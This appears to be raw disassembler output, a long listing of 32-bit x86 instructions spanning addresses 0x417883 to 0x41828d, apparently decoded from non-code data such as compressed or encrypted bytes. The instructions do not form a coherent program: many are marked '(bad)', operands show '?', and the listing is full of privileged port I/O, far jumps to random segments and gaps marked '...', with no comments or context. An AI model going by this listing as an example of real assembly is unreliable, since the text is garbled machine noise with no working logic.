  417883:	pop    ebx
  417884:	loopne 0x417828
  417886:	dec    ebp
  417887:	push   ds
  417888:	jmp    0x417874
  41788a:	jmp    0x417875
  41788c:	mov    ds:0x9a6c10ca,eax
  417891:	fstp   DWORD PTR [ebx-0x55]
  417894:	dec    esp
  417895:	into   
  417896:	jp     0x417841
  417898:	mov    edx,0x2199a1c2
  41789d:	out    dx,al
  41789e:	add    DWORD PTR [eax],ebx
  4178a0:	adc    bh,BYTE PTR [eax-0x19]
  4178a3:	xchg   edx,eax
  4178a4:	jmp    0x417884
  4178a6:	or     DWORD PTR [edi-0xa63e299],esp
  4178ac:	outs   dx,DWORD PTR ds:[esi]
  4178ad:	or     DWORD PTR [edi+0x2e27b3a],ebp
  4178b3:	leave  
  4178b4:	je     0x417841
  4178b6:	xchg   ecx,eax
  4178b7:	adc    DWORD PTR [eax-0xa],0xffffffab
  4178bb:	inc    edx
  4178bc:	dec    ebx
  4178bd:	jb     0x417868
  4178bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178c0:	ficom  WORD PTR [ebx-0x1a]
  4178c3:	xchg   edi,eax
  4178c4:	and    eax,DWORD PTR [ebp+0x2b]
  4178c7:	test   al,0x42
  4178c9:	test   eax,edi
  4178cb:	pop    edi
  4178cc:	lock mov eax,0xe433a11e
  4178d2:	fadd   st,st(4)
  4178d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178d5:	inc    esp
  4178d6:	xchg   bl,dh
  4178d8:	rol    BYTE PTR [edx-0x62c94982],0x4
  4178df:	adc    DWORD PTR [eax],edi
  4178e1:	mov    ebx,0x10b25cbe
  4178e6:	mov    edi,0xaccf58cd
  4178eb:	popa   
  4178ec:	cmp    ah,BYTE PTR [esi-0x247f86c5]
  4178f2:	xor    DWORD PTR [ecx+0x64],eax
  4178f5:	scas   eax,DWORD PTR es:[edi]
  4178f6:	enter  0x1d45,0xf7
  4178fa:	cmp    al,0xc3
  4178fc:	ds out dx,eax
  4178fe:	pop    ds
  4178ff:	mov    BYTE PTR [ebp+0x744f0c73],dh
  417905:	fidiv  WORD PTR [eax]
  417907:	shr    BYTE PTR [edx],cl
  417909:	xchg   edx,eax
  41790a:	fadd   DWORD PTR [esi+0x69087215]
  417910:	in     al,dx
	...
  417971:	add    BYTE PTR [eax],al
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	ret    0xb1f2
  417983:	dec    eax
  417984:	lahf   
  417985:	stc    
  417986:	add    BYTE PTR [eax],al
  417988:	add    eax,0x82000001
  41798d:	pop    eax
  41798e:	push   ss
  41798f:	mov    DWORD PTR gs:[edx+0x5740793e],esi
  417996:	xor    dh,bl
  417998:	(bad)  
  41799a:	adc    BYTE PTR [ebp-0x4847fa5f],ah
  4179a0:	inc    ecx
  4179a1:	xor    ebx,DWORD PTR [eax]
  4179a3:	cwde   
  4179a4:	ss (bad) 
  4179a6:	out    dx,eax
  4179a7:	sahf   
  4179a8:	sub    bh,BYTE PTR [esi]
  4179aa:	xchg   ebx,eax
  4179ab:	xor    al,0x2d
  4179ad:	neg    DWORD PTR [edx]
  4179af:	jge    0x417a2d
  4179b1:	popf   
  4179b2:	int    0x30
  4179b4:	jb     0x4179f6
  4179b6:	ins    BYTE PTR es:[edi],dx
  4179b7:	ds mov esp,0xd8077cc9
  4179bd:	push   ebp
  4179be:	adc    BYTE PTR [esi-0x2ce8c6ee],dh
  4179c4:	mov    eax,DWORD PTR [edx-0x6d]
  4179c7:	inc    esi
  4179c8:	or     ebp,DWORD PTR [edi]
  4179ca:	pop    esp
  4179cb:	inc    edi
  4179cc:	lock xchg bl,bl
  4179cf:	fist   DWORD PTR [ecx]
  4179d1:	inc    edi
  4179d2:	sub    bl,dh
  4179d4:	push   0xffffffa7
  4179d6:	sbb    al,0x3
  4179d8:	push   ebx
  4179d9:	sub    dl,bh
  4179db:	pop    es
  4179dc:	ffreep st(5)
  4179de:	out    0x16,al
  4179e0:	leave  
  4179e1:	in     al,0xe7
  4179e3:	in     eax,0x1c
  4179e5:	ja     0x4179a5
  4179e7:	add    DWORD PTR [edi],eax
  4179e9:	jbe    0x417a67
  4179eb:	cmp    al,0xd5
  4179ed:	adc    DWORD PTR [edx],ebp
  4179ef:	mov    eax,ds:0x63e8b6c7
  4179f4:	push   ss
  4179f5:	mov    ebx,0xa7c99825
  4179fa:	sub    dh,dl
  4179fc:	mov    WORD PTR [edx+edi*1+0x1d45a44b],fs
  417a03:	and    DWORD PTR ss:[edi+0x51],0xffffffd4
  417a08:	ja     0x417a4c
  417a0a:	fs sti 
  417a0c:	cmp    al,0xe5
  417a0e:	adc    al,0xb0
  417a10:	xchg   ecx,eax
  417a11:	cwde   
  417a12:	cmc    
  417a13:	je     0x417a82
  417a15:	hlt    
  417a16:	test   eax,0x1ccf8dbc
  417a1b:	fcomp  QWORD PTR [ecx-0x9ebd07f]
  417a21:	out    0x3,eax
  417a23:	add    DWORD PTR [edi-0x50456c62],edx
  417a29:	je     0x4179e1
  417a2b:	xor    DWORD PTR [esi+0x7c],edi
  417a2e:	adc    BYTE PTR [edx],ch
  417a30:	cmp    al,0xdc
  417a32:	sbb    BYTE PTR [edx+esi*1-0x2462e642],cl
  417a39:	adc    eax,0x67c7d7c5
  417a3e:	sahf   
  417a3f:	or     eax,0x175e127f
  417a44:	addr16 mov ecx,0x9dc8f7e2
  417a4a:	dec    esp
  417a4b:	push   cs
  417a4c:	sub    esi,DWORD PTR [ecx]
  417a4e:	xchg   esp,eax
  417a4f:	sub    DWORD PTR [edi-0x19],0x3c
  417a53:	add    esp,0x9e4f2bac
  417a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a5a:	and    BYTE PTR [eax+0x2e],bl
  417a5d:	push   esp
  417a5e:	in     eax,dx
  417a5f:	mov    bh,0x43
  417a61:	mov    al,0xe
  417a63:	icebp  
  417a64:	int    0xef
  417a66:	and    bh,0x33
  417a69:	dec    ebx
  417a6a:	add    eax,DWORD PTR [edi+ebx*1-0x76]
  417a6e:	pop    eax
  417a6f:	pop    ebx
  417a70:	enter  0x3ad6,0x5d
  417a74:	mov    edi,0x1390c4bc
  417a79:	sbb    BYTE PTR [eax-0x5f],bh
  417a7c:	shr    DWORD PTR [eax+0x1b],cl
  417a7f:	in     al,0xa0
  417a81:	mov    cl,dh
  417a83:	sub    bh,dl
  417a85:	fsubr  st(4),st
  417a87:	retf   0x2256
  417a8a:	add    al,0x1d
  417a8c:	push   es
  417a8d:	pop    esi
  417a8e:	ss jnp 0x417a1b
	...
  417af1:	add    BYTE PTR [eax],al
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x303750c9]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0xec000001
  417b0d:	sub    al,0x13
  417b0f:	dec    esp
  417b10:	int3   
  417b11:	xor    dl,BYTE PTR [ebx+0x9]
  417b14:	push   cs
  417b15:	mov    bl,0xfe
  417b17:	test   eax,0x118a0a67
  417b1c:	mov    ecx,0xa9dd3fce
  417b21:	(bad)  
  417b22:	test   al,0x19
  417b24:	push   ebp
  417b25:	mov    ?,ebp
  417b27:	ficom  DWORD PTR [edx]
  417b29:	pop    esp
  417b2a:	mov    bl,0x84
  417b2c:	ret    
  417b2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b2e:	mov    eax,0x8c0c2cfc
  417b33:	jno    0x417ade
  417b35:	sub    al,0x54
  417b37:	outs   dx,BYTE PTR ds:[esi]
  417b38:	and    bl,bl
  417b3a:	fsub   DWORD PTR [ebp+0x1b]
  417b3d:	or     al,0x65
  417b3f:	mov    ebp,0xf57405b6
  417b44:	adc    esp,ecx
  417b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b47:	fadd   st(4),st
  417b49:	sbb    cl,BYTE PTR [edi+eax*8-0x24]
  417b4d:	test   eax,0xbeb60425
  417b52:	jge    0x417b45
  417b54:	jle    0x417af3
  417b56:	out    0xf2,al
  417b58:	push   edi
  417b59:	adc    esi,edi
  417b5b:	sahf   
  417b5c:	or     esp,DWORD PTR [edx-0x657d9d0f]
  417b62:	retf   
  417b63:	mov    al,0xe0
  417b65:	daa    
  417b66:	aam    0x93
  417b68:	shl    ebp,cl
  417b6a:	in     eax,dx
  417b6b:	xchg   ebp,eax
  417b6c:	(bad)  
  417b6d:	loopne 0x417bdc
  417b6f:	pushf  
  417b70:	mov    bl,BYTE PTR [ecx]
  417b72:	popf   
  417b73:	js     0x417b51
  417b75:	lods   eax,DWORD PTR ds:[esi]
  417b76:	ins    DWORD PTR es:[edi],dx
  417b77:	test   al,0xe9
  417b79:	sahf   
  417b7a:	push   cs
  417b7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b7c:	xchg   edx,eax
  417b7d:	inc    edi
  417b7e:	fcom   st(5)
  417b80:	sub    esi,DWORD PTR [edx]
  417b82:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  417b84:	inc    esp
  417b85:	mov    ecx,0xb39be982
  417b8a:	and    ch,BYTE PTR [ebx-0x7c]
  417b8d:	aas    
  417b8e:	ds mov eax,0x11e2ebfe
  417b94:	jnp    0x417bd4
  417b96:	pop    ds
  417b97:	mov    dh,0x20
  417b99:	xor    edi,DWORD PTR [edx+eiz*8]
  417b9c:	les    eax,FWORD PTR [eax+ebp*4+0x83ac2eb]
  417ba3:	out    dx,eax
  417ba4:	daa    
  417ba5:	and    al,0x3b
  417ba7:	sahf   
  417ba8:	sbb    al,0x68
  417baa:	stos   BYTE PTR es:[edi],al
  417bab:	(bad)  
  417bac:	pop    ebx
  417bad:	stc    
  417bae:	ficomp DWORD PTR [esi+0x7934d2c9]
  417bb4:	mov    esi,0x6572041f
  417bb9:	jo     0x417b71
  417bbb:	and    bh,BYTE PTR [edi-0xa]
  417bbe:	iret   
  417bbf:	pop    ebx
  417bc0:	sti    
  417bc1:	test   DWORD PTR ss:[edx],eax
  417bc4:	push   edx
  417bc5:	xor    eax,0x4bac2767
  417bca:	xchg   edx,eax
  417bcb:	inc    ebp
  417bcc:	(bad)  
  417bce:	push   ds
  417bcf:	mov    BYTE PTR [esi-0x64b633d0],ah
  417bd5:	mov    ebx,0xa835e687
  417bda:	div    DWORD PTR [ecx]
  417bdc:	xor    al,0x35
  417bde:	add    BYTE PTR [eax+0x10],cl
  417be1:	mov    bl,0xb0
  417be3:	mov    ah,0xf5
  417be5:	int    0xe3
  417be7:	popf   
  417be8:	std    
  417be9:	inc    esp
  417bea:	cmp    esp,DWORD PTR fs:[ebx+esi*4]
  417bee:	jne    0x417c20
  417bf0:	ret    
  417bf1:	mov    eax,0x5068d084
  417bf6:	inc    edx
  417bf7:	fcmovbe st,st(3)
  417bf9:	cmp    bh,BYTE PTR [esi]
  417bfb:	lods   al,BYTE PTR ds:[esi]
  417bfc:	lea    eax,[edx]
  417bfe:	cmp    cl,BYTE PTR [ebx+ebp*4-0x5e19b9ce]
  417c05:	pop    esi
  417c06:	xchg   BYTE PTR [edx+0x4],ah
  417c09:	pop    ss
  417c0a:	cmp    eax,0x775de96f
  417c0f:	loopne 0x417c36
	...
  417c71:	add    BYTE PTR [eax],al
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x7e
  417c81:	outs   dx,BYTE PTR ds:[esi]
  417c82:	jo     0x417c5e
  417c84:	test   eax,0x50000fb
  417c89:	add    DWORD PTR [eax],eax
  417c8b:	add    BYTE PTR [esp+edi*8-0x37],ah
  417c8f:	push   ds
  417c90:	imul   edi,DWORD PTR [edi+0x73],0xffffffc9
  417c94:	mov    ah,0xf7
  417c96:	or     bl,ah
  417c98:	push   esp
  417c99:	xchg   BYTE PTR [eax],ch
  417c9b:	(bad)  
  417c9c:	sub    ch,BYTE PTR [eax+0x3]
  417c9f:	xor    al,0xa9
  417ca1:	push   es
  417ca2:	inc    ebp
  417ca3:	add    ch,BYTE PTR [eax]
  417ca5:	pop    ebx
  417ca6:	mov    cl,0x2e
  417ca8:	mov    ds:0x4beddeb1,eax
  417cad:	jle    0x417c3b
  417caf:	rcl    BYTE PTR [edi-0x3a216ab2],1
  417cb5:	loope  0x417d15
  417cb7:	jle    0x417c62
  417cb9:	hlt    
  417cba:	mov    ds:0x71ada3ab,al
  417cbf:	jmp    0x843c:0xce2bed0e
  417cc6:	add    BYTE PTR [edi+0x789a3edb],ah
  417ccc:	add    BYTE PTR [ecx-0x7f],cl
  417ccf:	cdq    
  417cd0:	sbb    eax,0xc6601e16
  417cd5:	addr16 push edi
  417cd7:	fld    TBYTE PTR ds:0x7390b867
  417cdd:	dec    edi
  417cde:	jae    0x417c65
  417ce0:	ds xchg ebp,eax
  417ce2:	add    DWORD PTR [ecx+0x1d],esi
  417ce5:	loop   0x417d4e
  417ce7:	jno    0x417ca0
  417ce9:	dec    edi
  417cea:	xchg   DWORD PTR [edx-0x33],edi
  417ced:	mov    bl,0xca
  417cef:	imul   esp,DWORD PTR [esi],0x8d3908d0
  417cf5:	add    ebp,0xe031f831
  417cfb:	js     0x417ccd
  417cfd:	xchg   BYTE PTR [eax],bl
  417cff:	push   ss
  417d00:	lahf   
  417d01:	loopne 0x417d6e
  417d03:	jecxz  0x417d62
  417d05:	dec    esp
  417d06:	mov    dh,0x50
  417d08:	jg     0x417d24
  417d0a:	ret    0xd214
  417d0d:	ror    edi,1
  417d0f:	ins    BYTE PTR es:[edi],dx
  417d10:	aam    0x89
  417d12:	and    al,0xe8
  417d14:	retf   
  417d15:	add    BYTE PTR [edx-0x58],0xb
  417d19:	mov    BYTE PTR [edi-0x3bc87364],ah
  417d1f:	cmp    edi,ebx
  417d21:	xchg   esi,eax
  417d22:	xor    cl,cl
  417d24:	cmc    
  417d25:	loope  0x417ccb
  417d27:	xchg   edx,eax
  417d28:	repz mov ds:0x56309f80,eax
  417d2e:	xchg   ecx,eax
  417d2f:	sbb    eax,DWORD PTR [eax]
  417d31:	int    0x2
  417d33:	cld    
  417d34:	xchg   ebp,eax
  417d35:	jp     0x417d10
  417d37:	inc    eax
  417d38:	cmp    eax,DWORD PTR [ecx]
  417d3a:	or     bl,bl
  417d3c:	jmp    0x417d30
  417d3e:	loopne 0x417db4
  417d40:	jns    0x417d1f
  417d42:	inc    edi
  417d43:	mov    cl,0xaf
  417d45:	lods   eax,DWORD PTR fs:[esi]
  417d47:	push   eax
  417d48:	add    bl,BYTE PTR [ebx+0x7d720a9e]
  417d4e:	fisttp WORD PTR [edx-0x38]
  417d51:	xchg   ebp,eax
  417d52:	cmp    DWORD PTR [edx+eax*1+0x31ae0b9a],0x5097539f
  417d5d:	mov    esp,0xa792a268
  417d62:	cmp    DWORD PTR [esi+0x3a50eab5],ebp
  417d68:	pop    edi
  417d69:	pop    es
  417d6a:	jge    0x417dab
  417d6c:	in     al,dx
  417d6d:	xor    al,0xd5
  417d6f:	data16 xchg BYTE PTR [eax-0x562a1dce],cl
  417d76:	(bad)  
  417d77:	retf   0xc778
  417d7a:	push   esi
  417d7b:	jae    0x417dd2
  417d7d:	jg     0x417d01
  417d7f:	idiv   ch
  417d81:	mov    cl,0x4c
  417d83:	jne    0x417d70
  417d85:	sbb    eax,0x48e14ddb
  417d8a:	movzx  ecx,BYTE PTR [edi+0x632421fe]
	...
  417df1:	add    BYTE PTR [eax],al
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	in     eax,dx
  417e01:	ds retf 
  417e03:	push   edx
  417e04:	scas   al,BYTE PTR es:[edi]
  417e05:	cld    
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    eax,0x98000001
  417e0d:	out    dx,al
  417e0e:	arpl   WORD PTR [ecx],si
  417e10:	add    DWORD PTR [esi+0x25],ecx
  417e13:	jle    0x417dc4
  417e15:	or     dh,dh
  417e17:	lods   eax,DWORD PTR ds:[esi]
  417e18:	inc    edi
  417e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e1a:	xchg   ecx,eax
  417e1b:	sub    eax,0x136c57bf
  417e20:	shr    BYTE PTR [eax+0x28],1
  417e23:	(bad)  
  417e24:	sub    dh,BYTE PTR [esi-0x3c]
  417e27:	sub    edi,esp
  417e29:	mov    al,ds:0x62a7cb27
  417e2e:	adc    dl,BYTE PTR [edi+0x43]
  417e31:	es pop es
  417e33:	sub    bl,BYTE PTR [eax-0x37]
  417e36:	mov    DWORD PTR [ebp-0x6e616954],esi
  417e3c:	not    BYTE PTR [eax+0x7139163a]
  417e42:	(bad)  
  417e43:	int3   
  417e44:	cmp    dl,al
  417e46:	push   eax
  417e47:	xlat   BYTE PTR ds:[ebx]
  417e48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e49:	or     al,0x7a
  417e4b:	push   ss
  417e4c:	imul   esi,DWORD PTR [ebx+0x3c],0xfffffff9
  417e50:	hlt    
  417e51:	leave  
  417e52:	setnp  BYTE PTR [esi]
  417e55:	inc    edi
  417e56:	push   ebp
  417e57:	add    ecx,DWORD PTR [eax-0x47]
  417e5a:	scas   al,BYTE PTR es:[edi]
  417e5b:	mov    ch,0xd6
  417e5d:	inc    esi
  417e5e:	or     bl,BYTE PTR [esi-0x51a20be8]
  417e64:	inc    bl
  417e66:	ss fst st(7)
  417e69:	popa   
  417e6a:	mov    bh,0x6b
  417e6c:	cli    
  417e6d:	sbb    DWORD PTR [edx-0x25a17ad1],ebp
  417e73:	add    al,0x9d
  417e75:	fmul   QWORD PTR [esi+ebx*1]
  417e78:	sub    esp,ecx
  417e7a:	ins    DWORD PTR es:[edi],dx
  417e7b:	pusha  
  417e7c:	add    ebp,ecx
  417e7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e7f:	sbb    DWORD PTR [ecx+0x4e],ebx
  417e82:	pop    edi
  417e83:	call   0x21e3:0x37585f0d
  417e8a:	imul   eax,DWORD PTR [ebx+0x3008db8a],0x76
  417e91:	out    dx,al
  417e92:	push   edx
  417e93:	or     bl,BYTE PTR [ebp+esi*2+0x12ee3b7a]
  417e9a:	clc    
  417e9b:	push   cs
  417e9c:	hlt    
  417e9d:	mov    ebp,esp
  417e9f:	jmp    0x365b:0x8efce7a
  417ea6:	pop    ss
  417ea7:	loop   0x417f09
  417ea9:	adc    DWORD PTR [edi],edx
  417eab:	aam    0xc1
  417ead:	ret    
  417eae:	push   esp
  417eaf:	push   ecx
  417eb0:	cmp    eax,0x56d0e90d
  417eb5:	out    0xa5,al
  417eb7:	mov    BYTE PTR [eax-0x4d4c26b1],ah
  417ebd:	sbb    DWORD PTR [ebp-0x38b4845b],ecx
  417ec3:	mov    ebx,0x50cde525
  417ec8:	cmp    ch,BYTE PTR [edx-0x76bfbc3c]
  417ece:	add    DWORD PTR [ecx+0x61f89308],eax
  417ed4:	mov    edx,ebx
  417ed6:	mov    al,ds:0xaea21fd8
  417edb:	add    BYTE PTR [ecx+0x2f5cb181],bh
  417ee1:	das    
  417ee2:	inc    ebx
  417ee3:	pop    edi
  417ee4:	push   esp
  417ee5:	xchg   ebp,eax
  417ee6:	(bad)  
  417ee8:	in     eax,0x8b
  417eea:	mov    WORD PTR [ebx-0x3],fs
  417eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eee:	inc    edx
  417eef:	mov    ds:0x4acbab64,eax
  417ef4:	imul   eax,DWORD PTR [esi+0x79],0x96fccb14
  417efb:	test   eax,0xe4bd3e56
  417f00:	enter  0xf70,0x87
  417f04:	rcl    BYTE PTR [edx+0x5c],cl
  417f07:	add    dl,ah
  417f09:	mov    bh,0x56
  417f0b:	int    0xbf
  417f0d:	push   cs
  417f0e:	mov    ds:0xf6d4,eax
	...
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	mov    dh,0x2b
  417f82:	loop   0x417fa8
  417f84:	mov    bl,0xfd
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    eax,0x2e000001
  417f8d:	ss jo  0x417f1b
  417f90:	scas   al,BYTE PTR es:[edi]
  417f91:	cdq    
  417f92:	scas   eax,DWORD PTR es:[edi]
  417f93:	arpl   di,bp
  417f95:	or     ch,dl
  417f97:	mov    ah,0x41
  417f99:	dec    edi
  417f9a:	in     eax,0x4a
  417f9c:	xchg   edx,eax
  417f9d:	push   edi
  417f9e:	mov    dh,0x9b
  417fa0:	out    0xd9,eax
  417fa2:	loopne 0x417f7f
  417fa4:	jl     0x41801c
  417fa6:	dec    ebp
  417fa7:	or     eax,0x6bfb46c8
  417fac:	add    eax,0xce799621
  417fb1:	pop    ds
  417fb2:	sub    eax,DWORD PTR [edx+esi*8+0x72]
  417fb6:	pop    edx
  417fb7:	nop
  417fb8:	sbb    al,0x3e
  417fba:	cs icebp 
  417fbc:	push   0x8ce6806c
  417fc1:	loope  0x417fea
  417fc3:	mov    ss,WORD PTR [edx-0x25]
  417fc6:	cmp    dh,BYTE PTR [eax]
  417fc8:	lock add ebp,DWORD PTR [ecx-0x19]
  417fcc:	mov    DWORD PTR [eax-0x49],ecx
  417fcf:	pop    ss
  417fd0:	mov    edx,ds
  417fd2:	xor    DWORD PTR [eax+0x1],edx
  417fd5:	out    dx,eax
  417fd6:	dec    ebp
  417fd7:	xchg   esp,eax
  417fd8:	sbb    al,0x73
  417fda:	push   es
  417fdb:	add    ecx,eax
  417fdd:	gs push esi
  417fdf:	lea    ecx,gs:[esi+ecx*2+0x3e]
  417fe4:	push   edi
  417fe5:	mov    ebx,0x87e4c794
  417fea:	(bad)  [edx+ebx*8+0x7b]
  417fee:	adc    BYTE PTR [ebp-0x4ffffde7],bl
  417ff4:	fdivr  DWORD PTR [edx+0x22f61c4f]
  417ffa:	sub    al,0x1c
  417ffc:	shr    dh,cl
  417ffe:	dec    edx
  417fff:	adc    eax,0x7d164165
  418004:	inc    edx
  418005:	mov    ?,WORD PTR [ebx+0x8]
  418008:	inc    esp
  418009:	not    edi
  41800b:	(bad)  
  41800c:	or     DWORD PTR [ebx+edx*2+0x5f],ebx
  418010:	jne    0x418091
  418012:	mov    bl,0xda
  418014:	jmp    0x41806c
  418016:	or     bh,al
  418018:	shl    DWORD PTR [ebp-0x7d2a4bc9],cl
  41801e:	(bad)  
  41801f:	mov    edx,eax
  418021:	mov    DWORD PTR [edi],eax
  418023:	frstor [ebp-0x3ca3805f]
  418029:	out    dx,al
  41802a:	call   0x5d2c8ec2
  41802f:	adc    DWORD PTR [esi+0x24],ecx
  418032:	sub    ecx,0xab3650f8
  418038:	mov    bh,0x42
  41803a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41803c:	sahf   
  41803d:	mov    bl,0x4f
  41803f:	int    0x5b
  418041:	jae    0x418075
  418043:	rol    DWORD PTR [edi+esi*4-0x1f],0x0
  418048:	mov    al,ds:0xfc59be28
  41804d:	sbb    al,0x6d
  41804f:	dec    esp
  418050:	retf   0x65b1
  418053:	(bad)  
  418054:	mov    ebp,0x5f519dd7
  418059:	pop    eax
  41805a:	push   ebp
  41805b:	enter  0x8648,0x1e
  41805f:	pop    ss
  418060:	jbe    0x418006
  418062:	xchg   esp,eax
  418063:	fs sbb al,0xb
  418066:	test   DWORD PTR [edi-0x4b7f81ee],edi
  41806c:	cmp    dl,BYTE PTR [esi+0x2e]
  41806f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418070:	out    dx,al
  418071:	xchg   edx,edx
  418073:	sub    ebx,DWORD PTR [ecx+0x3d]
  418076:	cmp    ebp,DWORD PTR [edi+0xe42c0ee]
  41807c:	cmp    BYTE PTR [edx+esi*2-0x61],al
  418080:	lods   eax,DWORD PTR ds:[esi]
  418081:	fiadd  WORD PTR [ebx]
  418083:	mov    BYTE PTR [ebp+esi*8-0x118b89ee],cl
  41808a:	cli    
  41808b:	sti    
  41808c:	pop    edi
  41808d:	retf   
  41808e:	pop    esp
  41808f:	test   BYTE PTR [ecx+0x0],ah
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0xb02fdebc,eax
  418101:	je     0x418084
  418103:	outs   dx,DWORD PTR ds:[esi]
  418104:	mov    eax,0x50000fe
  418109:	add    DWORD PTR [eax],eax
  41810b:	add    BYTE PTR [esi+0x110bb62],bl
  418111:	std    
  418112:	sbb    DWORD PTR [esi+0x1e],ecx
  418115:	lods   eax,DWORD PTR ds:[esi]
  418116:	fsubr  DWORD PTR [edx]
  418118:	pop    eax
  418119:	cmp    BYTE PTR [esi+0x45],0x93
  41811d:	cmp    cl,BYTE PTR [esi]
  41811f:	cmc    
  418120:	xlat   BYTE PTR ds:[ebx]
  418121:	mov    DWORD PTR [eax],edi
  418123:	fst    DWORD PTR [ebx+0x49]
  418126:	jecxz  0x4181a6
  418128:	push   esp
  418129:	fist   WORD PTR [edx+ebp*4+0x5d0d738b]
  418130:	jl     0x41810e
  418132:	push   ebx
  418133:	rol    DWORD PTR [edi+0x35420339],0x5
  41813a:	mov    bl,BYTE PTR [eax+0x15802173]
  418140:	dec    ebp
  418141:	fsub   DWORD PTR [ecx+ebx*8-0x50061fae]
  418148:	add    al,0xe1
  41814a:	in     al,0xc0
  41814c:	jg     0x418124
  41814e:	mov    dh,0x24
  418150:	xchg   ebp,eax
  418151:	imul   edx,ecx,0x5e
  418154:	dec    esp
  418155:	mov    eax,ds:0xb8ddb45f
  41815a:	xchg   ecx,eax
  41815b:	push   edi
  41815c:	cmp    edx,DWORD PTR [ecx-0x20]
  41815f:	std    
  418160:	pop    ebx
  418161:	jno    0x418116
  418163:	sti    
  418164:	or     DWORD PTR [edi-0xd],edx
  418167:	dec    esi
  418168:	(bad)  
  418169:	in     eax,0x2c
  41816b:	inc    esi
  41816c:	adc    BYTE PTR [edx-0x13],0x74
  418170:	mov    cl,0x6
  418172:	xor    esp,edi
  418174:	mov    ds:0xe5ae4fa7,eax
  418179:	jp     0x4181b3
  41817b:	jl     0x41811e
  41817d:	jg     0x41814e
  41817f:	mov    ah,0x51
  418181:	in     eax,0xb0
  418183:	in     eax,0xd
  418185:	mov    ecx,0x8cfff7f2
  41818a:	mov    ds:0x340c06f2,al
  41818f:	leave  
  418190:	sub    DWORD PTR [ebx],esp
  418192:	xchg   edi,eax
  418193:	push   eax
  418194:	adc    dl,BYTE PTR [ecx-0x21b80b74]
  41819a:	or     bh,BYTE PTR [edx+0xb]
  41819d:	(bad)  
  41819e:	sub    al,0xe2
  4181a0:	imul   edx,DWORD PTR [ebx+esi*1],0xfffffff9
  4181a4:	addr16 pusha 
  4181a6:	aas    
  4181a7:	sub    ah,BYTE PTR [edx]
  4181a9:	sub    BYTE PTR [esp+ecx*4+0x536e8d2b],dh
  4181b0:	out    dx,eax
  4181b1:	push   eax
  4181b2:	sub    eax,0xb10e50c6
  4181b7:	data16 loop 0x418211
  4181ba:	dec    edi
  4181bb:	cmp    al,0x7d
  4181bd:	stc    
  4181be:	outs   dx,BYTE PTR ds:[esi]
  4181bf:	outs   dx,BYTE PTR ds:[esi]
  4181c0:	mov    edi,0x84f01613
  4181c5:	pop    ss
  4181c6:	add    DWORD PTR [ebx],esp
  4181c8:	mov    ds:0x1a23d769,eax
  4181cd:	outs   dx,BYTE PTR ds:[esi]
  4181ce:	dec    edi
  4181cf:	imul   eax,DWORD PTR [ebx-0x5fb45c02],0x813b30f5
  4181d9:	loopne 0x418252
  4181db:	dec    esp
  4181dc:	push   es
  4181dd:	mov    ds:0xd491e888,al
  4181e2:	adc    eax,0xedd489f7
  4181e7:	int3   
  4181e8:	out    0x2d,eax
  4181ea:	sti    
  4181eb:	cdq    
  4181ec:	mov    bl,0x26
  4181ee:	data16 xchg BYTE PTR ds:0x52079dda,dl
  4181f5:	fldenv [ecx]
  4181f7:	jne    0x4181b2
  4181f9:	xchg   ebp,eax
  4181fa:	jo     0x4181ac
  4181fc:	idiv   DWORD PTR [eax+ebx*8+0x4]
  418200:	rol    BYTE PTR [esi-0x78b634d3],0x9d
  418207:	call   0x3047ece2
  41820c:	into   
  41820d:	pusha  
  41820e:	xchg   ecx,eax
  41820f:	pop    ebx
  418210:	pop    ecx
	...
  418271:	add    BYTE PTR [eax],al
  418273:	add    BYTE PTR [edi],dh
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x368cb8d6
  418282:	sbb    bh,BYTE PTR [ebx-0x43]
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR ds:0x8000001,al
  41828d:	sub    edi,DWORD PTR [esi]
